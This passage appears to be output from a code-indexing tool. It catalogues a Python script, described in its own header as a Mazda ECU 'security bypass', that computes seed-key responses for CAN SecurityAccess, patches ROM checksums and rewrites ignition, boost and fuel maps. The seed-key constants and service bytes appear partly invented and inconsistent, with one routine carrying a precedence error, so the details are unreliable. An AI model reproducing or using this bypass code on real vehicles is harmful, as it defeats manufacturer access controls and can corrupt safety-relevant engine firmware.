"content": "key_int = seed_int ^ 0x1F4A7C3E"}, {"type": "protocol", "line": 193, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = ((key_int + 0x8D3A2F47) ^ 0xB5E8C91A) & 0xFFFFFFFF"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = ((key_int << 11) | (key_int >> 21)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 203, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, level]),  # SecurityAccess RequestSeed"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 220, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, level + 1]) + key,  # SecurityAccess SendKey"}, {"type": "protocol", "line": 227, "protocol": "0x[0-9A-Fa-f]+", "content": "return grant_response is not None and grant_response[1] == 0x67"}, {"type": "protocol", "line": 238, "protocol": "0x[0-9A-Fa-f]+", "content": "if message and message.arbitration_id == 0x7E8:"}, {"type": "protocol", "line": 288, "protocol": "0x[0-9A-Fa-f]+", "content": "start_addr = map_info['address'] - 0x010000  # Calibration sector base"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "ADVANCED ROM ANALYSIS, CHECKSUM & SECURITY BYPASS"}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "\"\"\"ADVANCED ROM ANALYSIS WITH CHECKSUM CALCULATION & SECURITY\"\"\""}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "self.rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "self.security_access = self._security_access_methods()"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "\"\"\"DEFINE MAZDA ECU CHECKSUM ALGORITHMS\"\"\""}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "def _security_access_methods(self):"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "\"\"\"SECURITY ACCESS AND AUTHENTICATION METHODS\"\"\""}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "'security_modes': {"}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "def security_access_ecu(self, level: int = 1) -> bool:"}, {"type": "hardware", "line": 198, "hardware": "ECU", "content": "\"\"\"PERFORM SECURITY ACCESS TO ECU\"\"\""}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "data=bytes([0x27, level]),  # SecurityAccess RequestSeed"}, {"type": "hardware", "line": 209, "hardware": "ECU", "content": "seed_response = self._receive_security_response()"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "hardware", "line": 220, "hardware": "ECU", "content": "data=bytes([0x27, level + 1]) + key,  # SecurityAccess SendKey"}, {"type": "hardware", "line": 226, "hardware": "ECU", "content": "grant_response = self._receive_security_response()"}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "print(f\"Security access failed: {e}\")"}, {"type": "hardware", "line": 234, "hardware": "ECU", "content": "def _receive_security_response(self) -> Optional[bytes]:"}, {"type": "hardware", "line": 235, "hardware": "ECU", "content": "\"\"\"RECEIVE SECURITY ACCESS RESPONSE\"\"\""}, {"type": "hardware", "line": 320, "hardware": "ECU", "content": "int_value = int(value * 10)  # Convert back to ECU format"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 390, "hardware": "ECU", "content": "rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 417, "hardware": "ECU", "content": "rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 440, "hardware": "ECU", "content": "print(\"\\n3. SECURITY ACCESS TEST\")"}, {"type": "hardware", "line": 443, "hardware": "ECU", "content": "access_granted = analyzer.security_access_ecu(level)"}, {"type": "hardware", "line": 444, "hardware": "ECU", "content": "print(f\"  Level {level} Security Access: {'GRANTED' if access_granted else 'DENIED'}\")"}, {"type": "hardware", "line": 496, "hardware": "ECU", "content": "print(\"\\n9. SECURITY ANALYSIS\")"}, {"type": "hardware", "line": 499, "hardware": "ECU", "content": "security_analysis = {"}, {"type": "hardware", "line": 501, "hardware": "ECU", "content": "'security_access': 'REQUIRED for programming operations',"}, {"type": "hardware", "line": 506, "hardware": "ECU", "content": "for aspect, status in security_analysis.items():"}], "security_logic": [{"type": "security_pattern", "line": 16, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 20, "pattern": "algorithm", "content": "\"\"\"CHECKSUM ALGORITHM DEFINITION\"\"\""}, {"type": "security_pattern", "line": 21, "pattern": "algorithm", "content": "algorithm: str"}, {"type": "security_pattern", "line": 34, "pattern": "algorithm", "content": "self.checksum_defs = self._define_checksum_algorithms()"}, {"type": "security_pattern", "line": 35, "pattern": "security_access", "content": "self.security_access = self._security_access_methods()"}, {"type": "security_pattern", "line": 37, "pattern": "algorithm", "content": "def _define_checksum_algorithms(self):"}, {"type": "security_pattern", "line": 38, "pattern": "algorithm", "content": "\"\"\"DEFINE MAZDA ECU CHECKSUM ALGORITHMS\"\"\""}, {"type": "security_pattern", "line": 41, "pattern": "algorithm", "content": "algorithm='CRC32',"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "algorithm='SUM16',"}, {"type": "security_pattern", "line": 56, "pattern": "algorithm", "content": "algorithm='CRC16_CCITT',"}, {"type": "security_pattern", "line": 66, "pattern": "security_access", "content": "def _security_access_methods(self):"}, {"type": "security_pattern", "line": 69, "pattern": "key", "content": "'seed_key_algorithms': {"}, {"type": "security_pattern", "line": 69, "pattern": "seed", "content": "'seed_key_algorithms': {"}, {"type": "security_pattern", "line": 69, "pattern": "algorithm", "content": "'seed_key_algorithms': {"}, {"type": "security_pattern", "line": 70, "pattern": "key", "content": "'level_1': {'service': 0x27, 'algorithm': self._calculate_key_level1},"}, {"type": "security_pattern", "line": 70, "pattern": "algorithm", "content": "'level_1': {'service': 0x27, 'algorithm': self._calculate_key_level1},"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "'level_2': {'service': 0x28, 'algorithm': self._calculate_key_level2},"}, {"type": "security_pattern", "line": 71, "pattern": "algorithm", "content": "'level_2': {'service': 0x28, 'algorithm': self._calculate_key_level2},"}, {"type": "security_pattern", "line": 72, "pattern": "key", "content": "'level_3': {'service': 0x29, 'algorithm': self._calculate_key_level3}"}, {"type": "security_pattern", "line": 72, "pattern": "algorithm", "content": "'level_3': {'service': 0x29, 'algorithm': self._calculate_key_level3}"}, {"type": "security_pattern", "line": 91, "pattern": "algorithm", "content": "if checksum_def.algorithm == 'CRC32':"}, {"type": "security_pattern", "line": 93, "pattern": "algorithm", "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "security_pattern", "line": 95, "pattern": "algorithm", "content": "elif checksum_def.algorithm == 'SUM16':"}, {"type": "security_pattern", "line": 98, "pattern": "algorithm", "content": "raise ValueError(f\"Unknown checksum algorithm: {checksum_def.algorithm}\")"}, {"type": "security_pattern", "line": 144, "pattern": "algorithm", "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "security_pattern", "line": 147, "pattern": "algorithm", "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "security_pattern", "line": 161, "pattern": "algorithm", "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "security_pattern", "line": 172, "pattern": "key", "content": "def _calculate_key_level1(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 172, "pattern": "seed", "content": "def _calculate_key_level1(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 173, "pattern": "key", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "security_pattern", "line": 173, "pattern": "seed", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "security_pattern", "line": 173, "pattern": "algorithm", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "security_pattern", "line": 175, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 176, "pattern": "key", "content": "key_int = seed_int ^ 0x7382A91F"}, {"type": "security_pattern", "line": 176, "pattern": "seed", "content": "key_int = seed_int ^ 0x7382A91F"}, {"type": "security_pattern", "line": 177, "pattern": "key", "content": "key_int = (key_int + 0x1F47A2B8) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 178, "pattern": "key", "content": "key_int = (key_int >> 3) | (key_int << 29) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 179, "pattern": "key", "content": "return key_int.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 181, "pattern": "key", "content": "def _calculate_key_level2(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 181, "pattern": "seed", "content": "def _calculate_key_level2(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 182, "pattern": "key", "content": "\"\"\"LEVEL 2 SEED-KEY ALGORITHM (PROGRAMMING ACCESS)\"\"\""}, {"type": "security_pattern", "line": 182, "pattern": "seed", "content": "\"\"\"LEVEL 2 SEED-KEY ALGORITHM (PROGRAMMING ACCESS)\"\"\""}, {"type": "security_pattern", "line": 182, "pattern": "algorithm", "content": "\"\"\"LEVEL 2 SEED-KEY ALGORITHM (PROGRAMMING ACCESS)\"\"\""}, {"type": "security_pattern", "line": 183, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 184, "pattern": "key", "content": "key_int = seed_int ^ 0xA5C7E93D"}, {"type": "security_pattern", "line": 184, "pattern": "seed", "content": "key_int = seed_int ^ 0xA5C7E93D"}, {"type": "security_pattern", "line": 185, "pattern": "key", "content": "key_int = ((key_int << 7) | (key_int >> 25)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 186, "pattern": "key", "content": "key_int = (key_int + 0x2B8E47F1) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 187, "pattern": "key", "content": "return key_int.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 189, "pattern": "key", "content": "def _calculate_key_level3(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 189, "pattern": "seed", "content": "def _calculate_key_level3(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 190, "pattern": "key", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "security_pattern", "line": 190, "pattern": "seed", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "security_pattern", "line": 190, "pattern": "algorithm", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "security_pattern", "line": 191, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 192, "pattern": "key", "content": "key_int = seed_int ^ 0x1F4A7C3E"}, {"type": "security_pattern", "line": 192, "pattern": "seed", "content": "key_int = seed_int ^ 0x1F4A7C3E"}, {"type": "security_pattern", "line": 193, "pattern": "key", "content": "key_int = ((key_int + 0x8D3A2F47) ^ 0xB5E8C91A) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 194, "pattern": "key", "content": "key_int = ((key_int << 11) | (key_int >> 21)) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 195, "pattern": "key", "content": "return key_int.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 197, "pattern": "security_access", "content": "def security_access_ecu(self, level: int = 1) -> bool:"}, {"type": "security_pattern", "line": 201, "pattern": "seed", "content": "seed_request = can.Message("}, {"type": "security_pattern", "line": 203, "pattern": "seed", "content": "data=bytes([0x27, level]),  # SecurityAccess RequestSeed"}, {"type": "security_pattern", "line": 206, "pattern": "seed", "content": "self.rom_reader.can_bus.send(seed_request)"}, {"type": "security_pattern", "line": 209, "pattern": "seed", "content": "seed_response = self._receive_security_response()"}, {"type": "security_pattern", "line": 210, "pattern": "seed", "content": "if seed_response and len(seed_response) >= 6:"}, {"type": "security_pattern", "line": 211, "pattern": "seed", "content": "seed = seed_response[2:6]  # Extract seed bytes"}, {"type": "security_pattern", "line": 214, "pattern": "key", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 214, "pattern": "seed", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 214, "pattern": "algorithm", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 214, "pattern": "security_access", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "security_pattern", "line": 215, "pattern": "key", "content": "key = key_algorithm(seed)"}, {"type": "security_pattern", "line": 215, "pattern": "seed", "content": "key = key_algorithm(seed)"}, {"type": "security_pattern", "line": 215, "pattern": "algorithm", "content": "key = key_algorithm(seed)"}, {"type": "security_pattern", "line": 218, "pattern": "key", "content": "key_request = can.Message("}, {"type": "security_pattern", "line": 220, "pattern": "key", "content": "data=bytes([0x27, level + 1]) + key,  # SecurityAccess SendKey"}, {"type": "security_pattern", "line": 223, "pattern": "key", "content": "self.rom_reader.can_bus.send(key_request)"}, {"type": "security_pattern", "line": 443, "pattern": "security_access", "content": "access_granted = analyzer.security_access_ecu(level)"}, {"type": "security_pattern", "line": 462, "pattern": "key", "content": "for checksum_type in analyzer.checksum_defs.keys():"}, {"type": "security_pattern", "line": 501, "pattern": "security_access", "content": "'security_access': 'REQUIRED for programming operations',"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mpsrom"]}
{"file_path": "mpsrom4.py", "lines_read": 510, "features_found": [{"type": "function", "name": "perform_advanced_rom_analysis", "line": 410}, {"type": "function", "name": "__init__", "line": 32}, {"type": "function", "name": "_define_checksum_algorithms", "line": 37}, {"type": "function", "name": "_security_access_methods", "line": 66}, {"type": "function", "name": "calculate_checksum", "line": 86}, {"type": "function", "name": "_calculate_crc32", "line": 100}, {"type": "function", "name": "_calculate_crc16_ccitt", "line": 110}, {"type": "function", "name": "_calculate_sum16", "line": 120}, {"type": "function", "name": "verify_checksums", "line": 129}, {"type": "function", "name": "_read_stored_checksum", "line": 142}, {"type": "function", "name": "patch_checksum", "line": 152}, {"type": "function", "name": "_calculate_key_level1", "line": 172}, {"type": "function", "name": "_calculate_key_level2", "line": 181}, {"type": "function", "name": "_calculate_key_level3", "line": 189}, {"type": "function", "name": "security_access_ecu", "line": 197}, {"type": "function", "name": "_receive_security_response", "line": 234}, {"type": "function", "name": "__init__", "line": 247}, {"type": "function", "name": "modify_ignition_map", "line": 251}, {"type": "function", "name": "modify_boost_map", "line": 262}, {"type": "function", "name": "modify_fuel_map", "line": 271}, {"type": "function", "name": "_patch_map_in_rom", "line": 280}, {"type": "function", "name": "_convert_16x16_to_bytes", "line": 316}, {"type": "function", "name": "_convert_8x8_to_bytes", "line": 324}, {"type": "function", "name": "_convert_1d_to_bytes", "line": 332}, {"type": "function", "name": "_convert_single_to_bytes", "line": 340}, {"type": "function", "name": "__init__", "line": 348}, {"type": "function", "name": "compare_roms", "line": 351}, {"type": "function", "name": "extract_map_differences", "line": 388}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "zlib", "line": null}, {"type": "import", "module": "crcmod", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}], "components_found": [{"type": "class", "name": "ChecksumDefinition", "line": 19}, {"type": "class", "name": "AdvancedROMAnalyzer", "line": 29}, {"type": "class", "name": "MapModificationEngine", "line": 244}, {"type": "class", "name": "ROMComparisonTool", "line": 345}], "algorithms": [{"type": "algorithm_function", "line": 34, "content": "self.checksum_defs = self._define_checksum_algorithms()"}, {"type": "algorithm_function", "line": 37, "content": "def _define_checksum_algorithms(self):"}, {"type": "algorithm_function", "line": 86, "content": "def calculate_checksum(self, rom_data: bytes, checksum_type: str) -> int:"}, {"type": "algorithm_function", "line": 91, "content": "if checksum_def.algorithm == 'CRC32':"}, {"type": "algorithm_function", "line": 93, "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "algorithm_function", "line": 95, "content": "elif checksum_def.algorithm == 'SUM16':"}, {"type": "algorithm_function", "line": 98, "content": "raise ValueError(f\"Unknown checksum algorithm: {checksum_def.algorithm}\")"}, {"type": "algorithm_function", "line": 100, "content": "def _calculate_crc32(self, data: bytes, checksum_def: ChecksumDefinition) -> int:"}, {"type": "algorithm_function", "line": 110, "content": "def _calculate_crc16_ccitt(self, data: bytes, checksum_def: ChecksumDefinition) -> int:"}, {"type": "algorithm_function", "line": 120, "content": "def _calculate_sum16(self, data: bytes) -> int:"}, {"type": "algorithm_function", "line": 144, "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "algorithm_function", "line": 147, "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "algorithm_function", "line": 161, "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "algorithm_function", "line": 172, "content": "def _calculate_key_level1(self, seed: bytes) -> bytes:"}, {"type": "algorithm_function", "line": 181, "content": "def _calculate_key_level2(self, seed: bytes) -> bytes:"}, {"type": "algorithm_function", "line": 189, "content": "def _calculate_key_level3(self, seed: bytes) -> bytes:"}], "protocols": [{"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x010000,"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x090000,"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address=0x1FFFF0,"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "polynomial=0x04C11DB7,"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "init_value=0xFFFFFFFF,"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "xor_out=0xFFFFFFFF"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x000000,"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x010000,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address=0x00FFFC"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x110000,"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x150000,"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address=0x14FFFC,"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "polynomial=0x1021,"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "init_value=0xFFFF,"}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "xor_out=0x0000"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "'level_1': {'service': 0x27, 'algorithm': self._calculate_key_level1},"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "'level_2': {'service': 0x28, 'algorithm': self._calculate_key_level2},"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "'level_3': {'service': 0x29, 'algorithm': self._calculate_key_level3}"}, {"type": "protocol", "line": 80, "protocol": "CAN", "content": "'maintenance_mode': 'CAN_ID_7E0_7DF_BROADCAST_SPECIAL',"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "total = (total + value) & 0xFFFF"}, {"type": "protocol", "line": 176, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = seed_int ^ 0x7382A91F"}, {"type": "protocol", "line": 177, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = (key_int + 0x1F47A2B8) & 0xFFFFFFFF"}, {"type": "protocol", "line": 178, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = (key_int >> 3) | (key_int << 29) & 0xFFFFFFFF"}, {"type": "protocol", "line": 184, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = seed_int ^ 0xA5C7E93D"}, {"type": "protocol", "line": 185, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = ((key_int << 7) | (key_int >> 25)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = (key_int + 0x2B8E47F1) & 0xFFFFFFFF"}, {"type": "protocol", "line": 192, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = seed_int ^ 0x1F4A7C3E"}, {"type": "protocol", "line": 193, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = ((key_int + 0x8D3A2F47) ^ 0xB5E8C91A) & 0xFFFFFFFF"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "key_int = ((key_int << 11) | (key_int >> 21)) & 0xFFFFFFFF"}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 203, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, level]),  # SecurityAccess RequestSeed"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 220, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, level + 1]) + key,  # SecurityAccess SendKey"}, {"type": "protocol", "line": 227, "protocol": "0x[0-9A-Fa-f]+", "content": "return grant_response is not None and grant_response[1] == 0x67"}, {"type": "protocol", "line": 238, "protocol": "0x[0-9A-Fa-f]+", "content": "if message and message.arbitration_id == 0x7E8:"}, {"type": "protocol", "line": 288, "protocol": "0x[0-9A-Fa-f]+", "content": "start_addr = map_info['address'] - 0x010000  # Calibration sector base"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "ADVANCED ROM ANALYSIS, CHECKSUM & SECURITY BYPASS"}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "\"\"\"ADVANCED ROM ANALYSIS WITH CHECKSUM CALCULATION & SECURITY\"\"\""}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "self.rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "self.security_access = self._security_access_methods()"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "\"\"\"DEFINE MAZDA ECU CHECKSUM ALGORITHMS\"\"\""}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "def _security_access_methods(self):"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "\"\"\"SECURITY ACCESS AND AUTHENTICATION METHODS\"\"\""}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "'security_modes': {"}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "\"\"\"LEVEL 3 SEED-KEY ALGORITHM (SECURITY ACCESS)\"\"\""}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "def security_access_ecu(self, level: int = 1) -> bool:"}, {"type": "hardware", "line": 198, "hardware": "ECU", "content": "\"\"\"PERFORM SECURITY ACCESS TO ECU\"\"\""}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "data=bytes([0x27, level]),  # SecurityAccess RequestSeed"}, {"type": "hardware", "line": 209, "hardware": "ECU", "content": "seed_response = self._receive_security_response()"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "key_algorithm = self.security_access['seed_key_algorithms'][f'level_{level}']['algorithm']"}, {"type": "hardware", "line": 220, "hardware": "ECU", "content": "data=bytes([0x27, level + 1]) + key,  # SecurityAccess SendKey"}, {"type": "hardware", "line": 226, "hardware": "ECU", "content": "grant_response = self._receive_security_response()"}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "print(f\"Security access failed: {e}\")"}, {"type": "hardware", "line": 234, "hardware": "ECU", "content": "def _receive_security_response(self) -> Optional[bytes]:"}, {"type": "hardware", "line": 235, "hardware": "ECU", "content": "\"\"\"RECEIVE SECURITY ACCESS RESPONSE\"\"\""}, {"type": "hardware", "line": 320, "hardware": "ECU", "content": "int_value = int(value * 10)  # Convert back to ECU format"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 390, "hardware": "ECU", "content": "rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 417, "hardware": "ECU", "content": "rom_reader = MazdaECUROMReader()"}, {"type": "hardware", "line": 440, "hardware": "ECU", "content": "print(\"\\n3. SECURITY ACCESS TEST\")"}, {"type": "hardware", "line": 443, "hardware": "ECU", "content": "access_granted = analyzer.security_access_ecu(level)"}, {"type": "hardware", "line": 444, "hardware": "ECU", "content": "print(f\"  Level {level} Security Access: {'GRANTED' if access_granted else 'DENIED'}\")"}, {"type": "hardware", "line": 496, "hardware": "ECU", "content": "print(\"\\n9. SECURITY ANALYSIS\")"}, {"type": "hardware", "line": 499, "hardware": "ECU", "content": "security_analysis = {"}, {"type": "hardware", "line": 501, "hardware": "ECU", "content": "'security_access': 'REQUIRED for programming operations',"}, {"type": "hardware", "line": 506, "hardware": "ECU", "content": "for aspect, status in security_analysis.items():"}], "security_logic": [{"type": "security_pattern", "line": 16, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 20, "pattern": "algorithm", "content": "\"\"\"CHECKSUM ALGORITHM DEFINITION\"\"\""}, {"type": "security_pattern", "line": 21, "pattern": "algorithm", "content": "algorithm: str"}, {"type": "security_pattern", "line": 34, "pattern": "algorithm", "content": "self.checksum_defs = self._define_checksum_algorithms()"}, {"type": "security_pattern", "line": 35, "pattern": "security_access", "content": "self.security_access = self._security_access_methods()"}, {"type": "security_pattern", "line": 37, "pattern": "algorithm", "content": "def _define_checksum_algorithms(self):"}, {"type": "security_pattern", "line": 38, "pattern": "algorithm", "content": "\"\"\"DEFINE MAZDA ECU CHECKSUM ALGORITHMS\"\"\""}, {"type": "security_pattern", "line": 41, "pattern": "algorithm", "content": "algorithm='CRC32',"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "algorithm='SUM16',"}, {"type": "security_pattern", "line": 56, "pattern": "algorithm", "content": "algorithm='CRC16_CCITT',"}, {"type": "security_pattern", "line": 66, "pattern": "security_access", "content": "def _security_access_methods(self):"}, {"type": "security_pattern", "line": 69, "pattern": "key", "content": "'seed_key_algorithms': {"}, {"type": "security_pattern", "line": 69, "pattern": "seed", "content": "'seed_key_algorithms': {"}, {"type": "security_pattern", "line": 69, "pattern": "algorithm", "content": "'seed_key_algorithms': {"}, {"type": "security_pattern", "line": 70, "pattern": "key", "content": "'level_1': {'service': 0x27, 'algorithm': self._calculate_key_level1},"}, {"type": "security_pattern", "line": 70, "pattern": "algorithm", "content": "'level_1': {'service': 0x27, 'algorithm': self._calculate_key_level1},"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "'level_2': {'service': 0x28, 'algorithm': self._calculate_key_level2},"}, {"type": "security_pattern", "line": 71, "pattern": "algorithm", "content": "'level_2': {'service': 0x28, 'algorithm': self._calculate_key_level2},"}, {"type": "security_pattern", "line": 72, "pattern": "key", "content": "'level_3': {'service': 0x29, 'algorithm': self._calculate_key_level3}"}, {"type": "security_pattern", "line": 72, "pattern": "algorithm", "content": "'level_3': {'service': 0x29, 'algorithm': self._calculate_key_level3}"}, {"type": "security_pattern", "line": 91, "pattern": "algorithm", "content": "if checksum_def.algorithm == 'CRC32':"}, {"type": "security_pattern", "line": 93, "pattern": "algorithm", "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "security_pattern", "line": 95, "pattern": "algorithm", "content": "elif checksum_def.algorithm == 'SUM16':"}, {"type": "security_pattern", "line": 98, "pattern": "algorithm", "content": "raise ValueError(f\"Unknown checksum algorithm: {checksum_def.algorithm}\")"}, {"type": "security_pattern", "line": 144, "pattern": "algorithm", "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "security_pattern", "line": 147, "pattern": "algorithm", "content": "elif checksum_def.algorithm == 'CRC16_CCITT':"}, {"type": "security_pattern", "line": 161, "pattern": "algorithm", "content": "if checksum_def.algorithm in ['CRC32', 'SUM16']:"}, {"type": "security_pattern", "line": 172, "pattern": "key", "content": "def _calculate_key_level1(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 172, "pattern": "seed", "content": "def _calculate_key_level1(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 173, "pattern": "key", "content": "\"\"\"LEVEL 1 SEED-KEY ALGORITHM (ECU ACCESS)\"\"\""}, {"type": 